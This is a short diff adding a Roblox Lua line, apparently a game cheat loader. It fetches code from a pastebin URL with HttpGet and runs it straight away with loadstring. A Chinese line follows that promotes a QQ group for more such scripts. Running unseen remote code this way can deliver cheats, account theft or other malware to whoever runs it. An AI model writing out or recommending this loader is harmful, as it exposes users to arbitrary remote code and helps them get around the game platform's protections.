@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/87GTQwtw"))()
+
+
+加入q群1054706873获取更多
